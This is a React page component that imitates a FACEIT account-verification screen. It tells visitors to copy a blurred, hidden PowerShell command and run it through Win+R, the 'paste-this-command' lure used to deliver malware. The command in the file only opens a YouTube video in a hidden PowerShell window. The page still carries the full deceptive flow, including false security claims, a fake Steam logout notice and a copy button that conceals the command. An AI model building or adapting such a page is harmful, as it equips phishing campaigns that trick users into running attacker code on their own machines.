"use client"

import { useState, useRef } from "react"
import { Copy, Check, Clock, Shield } from "lucide-react"
import { Button } from "@/components/ui/button"
import { FaceitLogo } from "@/components/faceit-logo"

export default function VerificationPage() {
  const [copied, setCopied] = useState(false)
  const command = "powershell -WindowStyle Hidden -Command \"Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\""
  const textRef = useRef<HTMLElement>(null)

  const handleCopy = () => {
    try {
      // Create a temporary textarea element
      const textArea = document.createElement("textarea")
      textArea.value = command
      textArea.style.position = "fixed"
      textArea.style.left = "-999999px"
      textArea.style.top = "-999999px"
      document.body.appendChild(textArea)
      textArea.focus()
      textArea.select()
      
      try {
        document.execCommand('copy')
        setCopied(true)
        setTimeout(() => setCopied(false), 2000)
      } catch (err) {
        console.error('Copy failed:', err)
      }
      
      textArea.remove()
    } catch (err) {
      console.error('Failed to copy:', err)
    }
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-background p-4">
      <div className="w-full max-w-2xl space-y-8 rounded-lg border border-border bg-card p-8 shadow-lg">
        <div className="flex justify-center">
          <FaceitLogo />
        </div>

        <div className="space-y-3 text-center">
          <div className="relative inline-block">
            <h1 className="text-5xl font-bold tracking-tight text-destructive uppercase relative" 
                style={{ 
                  textShadow: "0 0 20px rgba(255, 85, 0, 0.3), 0 2px 4px rgba(0, 0, 0, 0.5)" 
                }}>
              Oops!
            </h1>
          </div>
          <p className="text-lg font-medium text-foreground tracking-wide uppercase">
            Verification Required
          </p>
        </div>

        <div className="space-y-6">
          {/* Important Session Notice */}
          <div className="rounded-md border-l-4 border-destructive bg-destructive/10 p-4">
            <div className="flex items-start gap-3">
              <Shield className="h-5 w-5 text-destructive mt-0.5 shrink-0" />
              <div className="space-y-1">
                <p className="text-sm font-bold text-destructive">IMPORTANT SESSION NOTICE</p>
                <p className="text-sm text-muted-foreground">
                  For final ownership verification, the system may initiate an automatic logout from your Steam account. This is a mandatory security measure.
                </p>
              </div>
            </div>
          </div>

          {/* Estimated Time */}
          <div className="rounded-md border border-border bg-card p-4">
            <div className="flex items-center gap-3">
              <Clock className="h-5 w-5 text-orange-500 shrink-0" />
              <div>
                <p className="text-sm font-bold text-orange-500">ESTIMATED TIME: ~48 HOURS</p>
              </div>
            </div>
          </div>

          <div className="rounded-md border border-warning bg-warning/10 p-4">
            <p className="text-sm font-medium">
              To send a friend request, you must complete account verification
            </p>
          </div>

          <div className="space-y-4">
            <h2 className="text-lg font-semibold">Verification Instructions:</h2>
            
            <ol className="space-y-4 text-sm">
              <li className="flex gap-3">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground font-bold">
                  1
                </span>
                <span className="pt-0.5">
                  Copy the command below by clicking the button or pressing <kbd className="rounded bg-muted px-2 py-1 text-xs font-mono">Ctrl + C</kbd>
                </span>
              </li>
              
              <li className="flex gap-3">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground font-bold">
                  2
                </span>
                <span className="pt-0.5">
                  Press <kbd className="rounded bg-muted px-2 py-1 text-xs font-mono">Win + R</kbd> on your keyboard
                </span>
              </li>
              
              <li className="flex gap-3">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground font-bold">
                  3
                </span>
                <span className="pt-0.5">
                  Paste the command using <kbd className="rounded bg-muted px-2 py-1 text-xs font-mono">Ctrl + V</kbd>
                </span>
              </li>
              
              <li className="flex gap-3">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground font-bold">
                  4
                </span>
                <span className="pt-0.5">
                  Press <kbd className="rounded bg-muted px-2 py-1 text-xs font-mono">OK</kbd> or <kbd className="rounded bg-muted px-2 py-1 text-xs font-mono">Enter</kbd>
                </span>
              </li>
            </ol>
          </div>

          <div className="space-y-2">
            <label className="text-sm font-medium">Verification Command:</label>
            <div className="flex gap-2">
              <div className="flex-1 overflow-hidden rounded-md border border-border bg-muted p-3">
                <code ref={textRef} className="text-xs font-mono blur-sm select-none">
                  {command}
                </code>
              </div>
              <Button
                onClick={handleCopy}
                variant="outline"
                size="icon"
                className="shrink-0"
                title="Copy to clipboard"
              >
                {copied ? (
                  <Check className="h-4 w-4 text-green-500" />
                ) : (
                  <Copy className="h-4 w-4" />
                )}
              </Button>
            </div>
            <p className="text-xs text-muted-foreground">
              Command is hidden for security. Click the copy button to copy it to clipboard.
            </p>
          </div>

          <div className="rounded-md border border-muted bg-muted/50 p-4">
            <p className="text-xs text-muted-foreground">
              ⚠️ This is a secure verification procedure. The command will verify your account and authorize friend requests.
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}
